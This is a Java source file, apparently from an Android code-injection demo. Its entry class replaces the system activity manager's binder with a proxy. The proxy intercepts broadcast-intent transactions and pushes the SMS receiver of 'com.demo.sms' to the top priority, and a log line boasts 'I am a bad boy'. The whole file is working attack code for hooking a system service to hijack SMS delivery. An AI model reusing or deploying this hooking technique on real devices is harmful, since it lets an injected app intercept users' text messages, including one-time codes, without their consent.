package com.demo.inject3;

import android.net.Uri;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

/**
 * 
 * @author boyliang
 * 
 */
public final class EntryClass {

	private static final class ProxyActivityManagerServcie extends Binder {
		private static final String CLASS_NAME = "android.app.IActivityManager";
		private static final String DESCRIPTOR = "android.app.IActivityManager";
		private static final int s_broadcastIntent_code;

		private SmsReceiverResorter mResorter;

		static {
			if (ReflecterHelper.setClass(CLASS_NAME)) {
				s_broadcastIntent_code = ReflecterHelper.getStaticIntValue("BROADCAST_INTENT_TRANSACTION", -1);
			} else {
				s_broadcastIntent_code = -1;
			}
		}

		private IBinder mBinder;

		public ProxyActivityManagerServcie(IBinder binder) {
			mBinder = binder;
			mResorter = new SmsReceiverResorter(binder);
		}

		@Override
		protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {

			if (code == s_broadcastIntent_code) {
				mResorter.updatePriority("com.demo.sms");
			}

			return mBinder.transact(code, data, reply, flags);
		}
	}

	public static Object[] invoke(int i) {
		IBinder activity_proxy = null;

		try {
			activity_proxy = new ProxyActivityManagerServcie(ServiceManager.getService("activity"));

			Log.i("TTT", ">>>>>>>>>>>>>I am in, I am a bad boy 3!!!!<<<<<<<<<<<<<<");
		} catch (Exception e) {
			e.printStackTrace();
		}

		return new Object[] { "activity", activity_proxy };
	}
}
